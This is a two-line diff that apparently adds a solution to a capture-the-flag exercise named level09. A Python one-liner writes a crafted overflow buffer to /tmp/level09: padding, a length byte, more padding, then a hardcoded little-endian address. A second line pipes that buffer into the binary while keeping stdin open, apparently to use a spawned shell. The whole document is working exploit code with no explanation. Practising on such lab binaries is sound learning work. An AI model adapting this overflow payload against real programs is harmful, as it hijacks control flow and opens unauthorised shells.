@@ -1,0 +1,2 @@
+python -c 'print "A" * 40 + "\xff\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' > /tmp/level09
+cat /tmp/level09 - | ./level09
